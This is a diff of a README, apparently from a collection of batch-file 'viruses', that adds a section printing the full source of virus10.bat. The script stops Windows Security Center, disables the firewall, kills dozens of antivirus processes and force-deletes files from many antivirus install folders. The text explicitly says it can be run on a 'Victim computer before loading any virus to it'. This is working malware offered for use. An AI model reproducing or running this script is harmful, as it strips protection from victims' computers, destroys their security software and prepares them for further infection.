@@ -189,9 +189,145 @@ loop
   </details>
 
 
+### Disable the Antivirus
 
-virus10.bat
-Disable the Antivirus
+
+
+<details><summary> Read More </summary>
+ 
+ 
+ <p><a href="https://github.com/SparkScratch-P/batch-virus/blob/main/viruses/virus10.bat">virus10.bat</a></p>
+<pre><code>@ echo off
+rem —
+rem Permanently Kill Anti-Virus
+net stop “Security Center”
+netsh firewall <span class="hljs-keyword">set</span> opmode <span class="hljs-comment">mode=disable</span>
+tskill /A av*
+tskill /<span class="hljs-comment">A fire*</span>
+tskill /A anti*
+cls
+tskill /<span class="hljs-comment">A spy*</span>
+tskill /A bullguard
+tskill /<span class="hljs-comment">A PersFw</span>
+tskill /A KAV*
+tskill /<span class="hljs-comment">A ZONEALARM</span>
+tskill /A SAFEWEB
+cls
+tskill /<span class="hljs-comment">A OUTPOST</span>
+tskill /A nv*
+tskill /<span class="hljs-comment">A nav*</span>
+tskill /A F-*
+tskill /<span class="hljs-comment">A ESAFE</span>
+tskill /A cle
+cls
+tskill /<span class="hljs-comment">A BLACKICE</span>
+tskill /A def*
+tskill /<span class="hljs-comment">A kav</span>
+tskill /A kav*
+tskill /<span class="hljs-comment">A avg*</span>
+tskill /A ash*
+cls
+tskill /<span class="hljs-comment">A aswupdsv</span>
+tskill /A ewid*
+tskill /<span class="hljs-comment">A guard*</span>
+tskill /A guar*
+tskill /<span class="hljs-comment">A gcasDt*</span>
+tskill /A msmp*
+cls
+tskill /<span class="hljs-comment">A mcafe*</span>
+tskill /A mghtml
+tskill /<span class="hljs-comment">A msiexec</span>
+tskill /A outpost
+tskill /<span class="hljs-comment">A isafe</span>
+tskill /A zap*
+cls
+tskill /<span class="hljs-comment">A zauinst</span>
+tskill /A upd*
+tskill /<span class="hljs-comment">A zlclien*</span>
+tskill /A minilog
+tskill /<span class="hljs-comment">A cc*</span>
+tskill /A norton*
+cls
+tskill /<span class="hljs-comment">A norton au*</span>
+tskill /A ccc*
+tskill /<span class="hljs-comment">A npfmn*</span>
+tskill /A loge*
+tskill /<span class="hljs-comment">A nisum*</span>
+tskill /A issvc
+tskill /<span class="hljs-comment">A tmp*</span>
+cls
+tskill /A tmn*
+tskill /<span class="hljs-comment">A pcc*</span>
+tskill /A cpd*
+tskill /<span class="hljs-comment">A pop*</span>
+tskill /A pav*
+tskill /<span class="hljs-comment">A padmin</span>
+cls
+tskill /A panda*
+tskill /<span class="hljs-comment">A avsch*</span>
+tskill /A sche*
+tskill /<span class="hljs-comment">A syman*</span>
+tskill /A virus*
+tskill /<span class="hljs-comment">A realm*</span>
+cls
+tskill /A sweep*
+tskill /<span class="hljs-comment">A scan*</span>
+tskill /A ad-*
+tskill /<span class="hljs-comment">A safe*</span>
+tskill /A avas*
+tskill /<span class="hljs-comment">A norm*</span>
+cls
+tskill /A offg*
+del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\alwils~<span class="hljs-number">1</span>\avast4\*.*
+del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\Lavasoft\Ad-awa~<span class="hljs-number">1</span>\*.exe
+del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\kasper~<span class="hljs-number">1</span>\*.exe
+cls
+del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\trojan~<span class="hljs-number">1</span>\*.exe
+del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\f-prot95\*.dll
+del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\tbav\*.dat
+cls
+del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\avpersonal\*.vdf
+del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\Norton~<span class="hljs-number">1</span>\*.cnt
+del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\Mcafee\*.*
+cls
+del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\Norton~<span class="hljs-number">1</span>\Norton~<span class="hljs-number">1</span>\Norton~<span class="hljs-number">3</span>\*.*
+del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\Norton~<span class="hljs-number">1</span>\Norton~<span class="hljs-number">1</span>\speedd~<span class="hljs-number">1</span>\*.*
+del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\Norton~<span class="hljs-number">1</span>\Norton~<span class="hljs-number">1</span>\*.*
+del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\Norton~<span class="hljs-number">1</span>\*.*
+cls
+del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\avgamsr\*.exe
+del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\avgamsvr\*.exe
+del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\avgemc\*.exe
+cls
+del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\avgcc\*.exe
+del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\avgupsvc\*.exe
+del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\grisoft
+del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\nood32krn\*.exe
+del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\nood32\*.exe
+cls
+del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\nod32
+del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\nood32
+del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\kav\*.exe
+del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\kavmm\*.exe
+del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\kaspersky\*.*
+cls
+del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\ewidoctrl\*.exe
+del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\guard\*.exe
+del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\ewido\*.exe
+cls
+del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\pavprsrv\*.exe
+del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\pavprot\*.exe
+del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\avengine\*.exe
+cls
+del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\apvxdwin\*.exe
+del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\webproxy\*.exe
+del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\panda software\*.*
+rem —
+</code></pre><p>This will disable your antivirus for the timbing.  One can run it on Victim computer before loading any virus to it!</p>
+     
+  </details>
+ 
+
 virus11.bat
 Task-kill some apps
 virus12.bat
